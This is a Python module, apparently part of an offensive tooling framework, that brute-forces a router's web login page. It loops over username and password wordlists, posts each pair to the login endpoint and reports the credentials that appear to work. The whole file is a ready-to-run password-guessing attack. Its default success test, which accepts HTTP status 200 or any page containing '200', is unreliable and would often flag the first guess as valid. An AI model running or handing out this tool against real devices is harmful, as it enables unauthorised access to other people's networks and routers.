import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
import time
import os
from pathlib import Path

MODULE_INFO = {
    "name": "bruteforce/router_login",
    "description": "Brute-force router login page with username and password wordlists"
}

OPTIONS = {
    "TARGET_URL": {
        "required": True,
        "default": "http://192.168.1.1",
        "description": "Target router login URL (e.g., http://192.168.1.1)"
    },
    "USERNAME_LIST": {
        "required": True,
        "default": "usernames.txt",
        "description": "Path to username wordlist file"
    },
    "PASSWORD_LIST": {
        "required": True,
        "default": "passwords.txt",
        "description": "Path to password wordlist file"
    },
    "DELAY": {
        "required": False,
        "default": "0.5",
        "description": "Delay between attempts in seconds (float)"
    },
    "LOGIN_ENDPOINT": {
        "required": False,
        "default": "/login",
        "description": "Login endpoint path (e.g., /login or /index.html)"
    },
    "SUCCESS_INDICATOR": {
        "required": False,
        "default": "200",
        "description": "HTTP status code or response text indicating success"
    }
}

def load_wordlist(file_path):
    """Load a wordlist from a file, return list of non-empty lines."""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def run(session, options):
    console = Console()
    target_url = options.get("TARGET_URL", "http://192.168.1.1")
    username_list = options.get("USERNAME_LIST", "usernames.txt")
    password_list = options.get("PASSWORD_LIST", "passwords.txt")
    delay = float(options.get("DELAY", "0.5"))
    login_endpoint = options.get("LOGIN_ENDPOINT", "/login")
    success_indicator = options.get("SUCCESS_INDICATOR", "200")

    # Construct full login URL
    if not target_url.endswith('/'):
        target_url += '/'
    full_url = target_url + login_endpoint.lstrip('/')

    # Load wordlists
    usernames = load_wordlist(username_list)
    passwords = load_wordlist(password_list)

    if not usernames or not passwords:
        console.print(f"[red]Error: Could not load wordlists. Check paths: {username_list}, {password_list}[/red]")
        return

    console.print(f"[yellow]Starting brute-force on {full_url} with {len(usernames)} usernames and {len(passwords)} passwords...[/yellow]")

    # Table for results
    table = Table(title="Brute-Force Results", box=None)
    table.add_column("Username", style="cyan")
    table.add_column("Password", style="cyan")
    table.add_column("Status", style="green")
    successes = []

    # Session for persistent connections
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    total_attempts = 0
    max_attempts = 10000  # Safety limit to prevent excessive attempts

    try:
        for username in usernames:
            for password in passwords:
                total_attempts += 1
                if total_attempts > max_attempts:
                    console.print("[red]Max attempts reached (10000). Stopping.[/red]")
                    break

                try:
                    # Simulate a typical router login POST request
                    data = {"username": username, "password": password}
                    response = session.post(full_url, data=data, timeout=5, allow_redirects=True)

                    # Check for success
                    status = f"Failed ({response.status_code})"
                    if str(response.status_code) == success_indicator or success_indicator.lower() in response.text.lower():
                        status = "Success"
                        successes.append((username, password, status))
                        table.add_row(username, password, f"[green]{status}[/green]")
                        console.print(table)
                        console.print(f"[green]Success found! Stopping brute-force.[/green]")
                        break

                    # Display progress every 10 attempts
                    if total_attempts % 10 == 0:
                        console.print(f"[yellow]Attempt {total_attempts}: {username}:{password} -> {response.status_code}[/yellow]")

                    time.sleep(delay)  # Respect delay to avoid overwhelming the server

                except requests.RequestException as e:
                    console.print(f"[red]Error during attempt {username}:{password}: {e}[/red]")

            if successes:  # Stop outer loop if success found
                break

    finally:
        session.close()

    # Display final results
    if successes:
        console.print(Panel(table, title="Successful Credentials", border_style="green"))
    else:
        console.print("[yellow]No valid credentials found.[/yellow]")

    console.print(f"[cyan]Total attempts: {total_attempts}[/cyan]")
